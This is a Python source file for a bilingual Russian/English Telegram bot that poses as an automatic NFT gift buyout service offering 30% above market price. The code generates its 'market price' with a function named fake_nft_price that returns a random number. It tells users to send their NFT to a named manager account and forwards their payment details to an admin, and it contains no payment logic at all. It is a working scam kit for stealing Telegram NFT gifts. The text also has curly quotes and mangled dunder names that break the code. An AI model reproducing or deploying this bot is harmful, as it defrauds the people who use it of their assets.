import logging
import random
import os
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
Application, CommandHandler, CallbackQueryHandler,
MessageHandler, filters, ContextTypes, ConversationHandler
)

import os
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv(“BOT_TOKEN”)
ADMIN_ID = int(os.getenv(“ADMIN_ID”))
MANAGER = os.getenv(“MANAGER”, “@hostelman”)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(**name**)

# States

LANG, MAIN_MENU, SELL_NFT_LINK, SELL_CURRENCY, SELL_CONFIRM, SELL_REQUISITES = range(6)

TEXTS = {
“ru”: {
“welcome”: (
“👋 *Приветствую! Это Автоматическая Скупка NFT подарков в Telegram* 🎁\n\n”
“Мы выкупаем NFT подарки *выше рыночной цены на 30%* — быстро, безопасно и честно.\n\n”
“💎 Работаем с любыми NFT подарками из Telegram\n”
“⚡️ Мгновенная оценка по параметрам: модель, фон, узор\n”
“💸 Выплата в удобной для вас валюте\n”
“🔒 Безопасные сделки через менеджера\n\n”
“Выберите действие:”
),
“how_works”: (
“📋 *Как проводится сделка?*\n\n”
“1️⃣ Вы отправляете ссылку на NFT подарок (например: https://t.me/nft/PlushPepe-2133)\n\n”
“2️⃣ Бот автоматически рассчитывает рыночную стоимость NFT по параметрам:\n”
“   • Модель\n   • Фон\n   • Узор\n\n”
“3️⃣ Вы выбираете способ получения оплаты:\n”
“   CryptoBot, TRC20, Tonkeeper или Карта\n\n”
“4️⃣ Бот предлагает свою сумму за ваш NFT (+30% к рынку)\n\n”
“5️⃣ Если согласны — подтверждаете сделку\n\n”
“6️⃣ Вы отправляете NFT менеджеру {manager}, получаете оплату\n\n”
“✅ Всё просто и прозрачно!”
).format(manager=MANAGER),
“support”: f”🆘 *Поддержка*\n\nПо всем вопросам обращайтесь к нашему менеджеру:\n👤 {MANAGER}\n\nОн поможет вам 24/7!”,
“send_link”: “🔗 Отправьте ссылку на ваш NFT подарок\n\nПример: https://t.me/nft/PlushPepe-2133”,
“invalid_link”: “❌ Это не похоже на ссылку NFT подарка.\n\nПожалуйста, отправьте корректную ссылку вида:\nhttps://t.me/nft/НазваниеNFT-Номер”,
“choose_currency”: “💱 Выберите способ получения оплаты:”,
“offer”: (
“💎 *Моё предложение за ваш NFT*\n\n”
“🔗 NFT: {link}\n”
“📊 Рыночная цена: ~{market} {currency_sym}\n”
“💰 *Моя цена (+30%): {offer} {currency_sym}*\n\n”
“Если согласны — нажмите ✅ *Да*, если нет — ❌ *Нет*”
),
“send_requisites”: “📝 Введите ваши реквизиты для получения оплаты ({currency}):”,
“deal_created”: (
“✅ *Сделка оформлена!*\n\n”
“🔗 NFT: {link}\n”
“💰 Сумма: {offer} {currency_sym}\n”
“💳 Реквизиты: {req}\n\n”
“📦 *Теперь отправьте ваш NFT менеджеру {manager}*\n”
“После получения NFT менеджер переведёт вам оплату в течение 5-15 минут.\n\n”
“❗️ Важно: передавайте NFT только через официальный аккаунт {manager}”
),
“deal_cancelled”: “❌ Сделка отменена. Если передумаете — нажмите *Продать NFT*.”,
“btn_sell”: “💰 Продать NFT”,
“btn_how”: “📋 Как проводится сделка?”,
“btn_support”: “🆘 Поддержка”,
“btn_yes”: “✅ Да, согласен”,
“btn_no”: “❌ Нет, отказаться”,
“btn_back”: “🔙 Назад”,
},
“en”: {
“welcome”: (
“👋 *Welcome! This is the Automatic NFT Gift Buyout Bot in Telegram* 🎁\n\n”
“We buy NFT gifts *30% above market price* — fast, safe and fair.\n\n”
“💎 Works with any Telegram NFT gifts\n”
“⚡️ Instant evaluation by: model, background, pattern\n”
“💸 Payment in your preferred currency\n”
“🔒 Secure deals via manager\n\n”
“Choose an action:”
),
“how_works”: (
“📋 *How does the deal work?*\n\n”
“1️⃣ You send a link to your NFT gift (e.g.: https://t.me/nft/PlushPepe-2133)\n\n”
“2️⃣ The bot calculates the market price by:\n”
“   • Model\n   • Background\n   • Pattern\n\n”
“3️⃣ You choose your payment method:\n”
“   CryptoBot, TRC20, Tonkeeper or Card\n\n”
“4️⃣ The bot makes an offer (+30% to market)\n\n”
“5️⃣ If you agree — confirm the deal\n\n”
“6️⃣ Send the NFT to manager {manager}, receive payment\n\n”
“✅ Simple and transparent!”
).format(manager=MANAGER),
“support”: f”🆘 *Support*\n\nContact our manager for any questions:\n👤 {MANAGER}\n\nAvailable 24/7!”,
“send_link”: “🔗 Send the link to your NFT gift\n\nExample: https://t.me/nft/PlushPepe-2133”,
“invalid_link”: “❌ This doesn’t look like an NFT gift link.\n\nPlease send a valid link like:\nhttps://t.me/nft/NFTName-Number”,
“choose_currency”: “💱 Choose your payment method:”,
“offer”: (
“💎 *My offer for your NFT*\n\n”
“🔗 NFT: {link}\n”
“📊 Market price: ~{market} {currency_sym}\n”
“💰 *My price (+30%): {offer} {currency_sym}*\n\n”
“If you agree — press ✅ *Yes*, if not — ❌ *No*”
),
“send_requisites”: “📝 Enter your payment details ({currency}):”,
“deal_created”: (
“✅ *Deal confirmed!*\n\n”
“🔗 NFT: {link}\n”
“💰 Amount: {offer} {currency_sym}\n”
“💳 Details: {req}\n\n”
“📦 *Now send your NFT to manager {manager}*\n”
“After receiving the NFT, the manager will transfer payment within 5-15 minutes.\n\n”
“❗️ Important: only transfer NFT to the official account {manager}”
),
“deal_cancelled”: “❌ Deal cancelled. Press *Sell NFT* whenever you’re ready.”,
“btn_sell”: “💰 Sell NFT”,
“btn_how”: “📋 How does it work?”,
“btn_support”: “🆘 Support”,
“btn_yes”: “✅ Yes, agree”,
“btn_no”: “❌ No, cancel”,
“btn_back”: “🔙 Back”,
}
}

CURRENCIES = {
“CryptoBot”: {“sym”: “USDT”, “rate”: 1.0},
“TRC20 (USDT)”: {“sym”: “USDT”, “rate”: 1.0},
“Tonkeeper (TON)”: {“sym”: “TON”, “rate”: 0.18},
“💳 Карта Украина”: {“sym”: “UAH”, “rate”: 40.0},
“💳 Карта Россия”: {“sym”: “RUB”, “rate”: 92.0},
“💳 Карта США”: {“sym”: “USD”, “rate”: 1.0},
“💳 Карта Беларусь”: {“sym”: “BYN”, “rate”: 3.3},
“💳 Карта Казахстан”: {“sym”: “KZT”, “rate”: 460.0},
“💳 Карта Узбекистан”: {“sym”: “UZS”, “rate”: 12600.0},
“💳 Карта Турция”: {“sym”: “TRY”, “rate”: 32.0},
“💳 Карта Азербайджан”: {“sym”: “AZN”, “rate”: 1.7},
}

def get_text(context, key):
lang = context.user_data.get(“lang”, “ru”)
return TEXTS[lang][key]

def main_menu_keyboard(context):
lang = context.user_data.get(“lang”, “ru”)
t = TEXTS[lang]
return InlineKeyboardMarkup([
[InlineKeyboardButton(t[“btn_sell”], callback_data=“sell”)],
[InlineKeyboardButton(t[“btn_how”], callback_data=“how”)],
[InlineKeyboardButton(t[“btn_support”], callback_data=“support”)],
])

def currency_keyboard():
buttons = []
for name in CURRENCIES:
buttons.append([InlineKeyboardButton(name, callback_data=f”cur_{name}”)])
return InlineKeyboardMarkup(buttons)

def fake_nft_price():
“”“Generate a fake market price for NFT”””
return round(random.uniform(15, 120), 2)

# ─── Handlers ───────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
keyboard = InlineKeyboardMarkup([
[
InlineKeyboardButton(“🇷🇺 Русский”, callback_data=“lang_ru”),
InlineKeyboardButton(“🇬🇧 English”, callback_data=“lang_en”),
]
])
await update.message.reply_text(
“🌐 Выберите язык / Choose language:”,
reply_markup=keyboard
)
return LANG

async def lang_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
query = update.callback_query
await query.answer()
lang = query.data.split(”_”)[1]
context.user_data[“lang”] = lang
t = TEXTS[lang]

```
await query.edit_message_text(
    t["welcome"],
    parse_mode="Markdown",
    reply_markup=main_menu_keyboard(context)
)
return MAIN_MENU
```

async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
query = update.callback_query
await query.answer()
data = query.data
lang = context.user_data.get(“lang”, “ru”)
t = TEXTS[lang]

```
if data == "sell":
    await query.edit_message_text(t["send_link"], parse_mode="Markdown")
    return SELL_NFT_LINK

elif data == "how":
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(t["btn_back"], callback_data="back_main")]])
    await query.edit_message_text(t["how_works"], parse_mode="Markdown", reply_markup=kb)
    return MAIN_MENU

elif data == "support":
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(t["btn_back"], callback_data="back_main")]])
    await query.edit_message_text(t["support"], parse_mode="Markdown", reply_markup=kb)
    return MAIN_MENU

elif data == "back_main":
    await query.edit_message_text(t["welcome"], parse_mode="Markdown", reply_markup=main_menu_keyboard(context))
    return MAIN_MENU
```

async def receive_nft_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
text = update.message.text.strip()
# Validate NFT link
if “t.me/nft/” not in text and “telegram.me/nft/” not in text:
t = TEXTS[context.user_data.get(“lang”, “ru”)]
await update.message.reply_text(t[“invalid_link”], parse_mode=“Markdown”)
return SELL_NFT_LINK

```
context.user_data["nft_link"] = text
context.user_data["market_price"] = fake_nft_price()
t = TEXTS[context.user_data.get("lang", "ru")]

await update.message.reply_text(t["choose_currency"], reply_markup=currency_keyboard())
return SELL_CURRENCY
```

async def choose_currency_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
query = update.callback_query
await query.answer()
currency_name = query.data.replace(“cur_”, “”)
context.user_data[“currency”] = currency_name

```
cur = CURRENCIES[currency_name]
market_usd = context.user_data["market_price"]
market_local = round(market_usd * cur["rate"], 2)
offer_local = round(market_local * 1.3, 2)

context.user_data["offer"] = offer_local
context.user_data["currency_sym"] = cur["sym"]

t = TEXTS[context.user_data.get("lang", "ru")]
msg = t["offer"].format(
    link=context.user_data["nft_link"],
    market=market_local,
    offer=offer_local,
    currency_sym=cur["sym"]
)
kb = InlineKeyboardMarkup([
    [
        InlineKeyboardButton(t["btn_yes"], callback_data="confirm_yes"),
        InlineKeyboardButton(t["btn_no"], callback_data="confirm_no"),
    ]
])
await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=kb)
return SELL_CONFIRM
```

async def confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
query = update.callback_query
await query.answer()
t = TEXTS[context.user_data.get(“lang”, “ru”)]

```
if query.data == "confirm_no":
    await query.edit_message_text(t["deal_cancelled"], parse_mode="Markdown", reply_markup=main_menu_keyboard(context))
    return MAIN_MENU

currency = context.user_data.get("currency", "")
await query.edit_message_text(
    t["send_requisites"].format(currency=currency),
    parse_mode="Markdown"
)
return SELL_REQUISITES
```

async def receive_requisites(update: Update, context: ContextTypes.DEFAULT_TYPE):
req = update.message.text.strip()
t = TEXTS[context.user_data.get(“lang”, “ru”)]

```
msg = t["deal_created"].format(
    link=context.user_data.get("nft_link", ""),
    offer=context.user_data.get("offer", ""),
    currency_sym=context.user_data.get("currency_sym", ""),
    req=req,
    manager=MANAGER
)
await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=main_menu_keyboard(context))

# Notify admin
try:
    admin_msg = (
        f"🔔 *Новая сделка!*\n\n"
        f"👤 User: @{update.effective_user.username or update.effective_user.id}\n"
        f"🔗 NFT: {context.user_data.get('nft_link')}\n"
        f"💰 Сумма: {context.user_data.get('offer')} {context.user_data.get('currency_sym')}\n"
        f"💱 Валюта: {context.user_data.get('currency')}\n"
        f"💳 Реквизиты: {req}"
    )
    await update.get_bot().send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
except Exception as e:
    logger.error(f"Admin notify error: {e}")

return MAIN_MENU
```

# ─── Admin Panel ─────────────────────────────────────────────

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
if update.effective_user.id != ADMIN_ID:
await update.message.reply_text(“❌ Нет доступа.”)
return

```
kb = InlineKeyboardMarkup([
    [InlineKeyboardButton("📊 Статистика", callback_data="adm_stats")],
    [InlineKeyboardButton("📢 Рассылка", callback_data="adm_broadcast")],
    [InlineKeyboardButton("🖼 Изменить баннер", callback_data="adm_banner")],
    [InlineKeyboardButton("👥 Пользователи", callback_data="adm_users")],
])

# Admin banner with photo
banner_text = (
    "🛠 *Панель администратора*\n\n"
    "👑 Добро пожаловать, Admin!\n"
    "━━━━━━━━━━━━━━━\n"
    "🤖 Бот: NFT Auto Buyout\n"
    "💼 Менеджер: @hostelman\n"
    "━━━━━━━━━━━━━━━\n"
    "Выберите действие:"
)
await update.message.reply_photo(
    photo="https://i.imgur.com/4M34hi2.png",
    caption=banner_text,
    parse_mode="Markdown",
    reply_markup=kb
)
```

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
query = update.callback_query
if update.effective_user.id != ADMIN_ID:
await query.answer(“❌ Нет доступа”, show_alert=True)
return
await query.answer()

```
data = query.data
if data == "adm_stats":
    await query.message.reply_text(
        "📊 *Статистика*\n\n"
        "👤 Всего пользователей: N/A\n"
        "💰 Сделок сегодня: N/A\n"
        "📈 Общий оборот: N/A",
        parse_mode="Markdown"
    )
elif data == "adm_broadcast":
    await query.message.reply_text("📢 Функция рассылки. Отправьте текст командой /broadcast <текст>")
elif data == "adm_banner":
    await query.message.reply_text("🖼 Отправьте новое фото для баннера командой /setbanner")
elif data == "adm_users":
    await query.message.reply_text("👥 База пользователей. Функция в разработке.")
```

# ─── Main ────────────────────────────────────────────────────

def main():
app = Application.builder().token(TOKEN).build()

```
conv = ConversationHandler(
    entry_points=[CommandHandler("start", start)],
    states={
        LANG: [CallbackQueryHandler(lang_callback, pattern="^lang_")],
        MAIN_MENU: [CallbackQueryHandler(main_menu_callback)],
        SELL_NFT_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_nft_link)],
        SELL_CURRENCY: [CallbackQueryHandler(choose_currency_callback, pattern="^cur_")],
        SELL_CONFIRM: [CallbackQueryHandler(confirm_callback, pattern="^confirm_")],
        SELL_REQUISITES: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_requisites)],
    },
    fallbacks=[CommandHandler("start", start)],
    allow_reentry=True,
)

app.add_handler(conv)
app.add_handler(CommandHandler("admin", admin_panel))
app.add_handler(CallbackQueryHandler(admin_callback, pattern="^adm_"))

logger.info("Bot started!")
app.run_polling()
```

if **name** == “**main**”:
main()
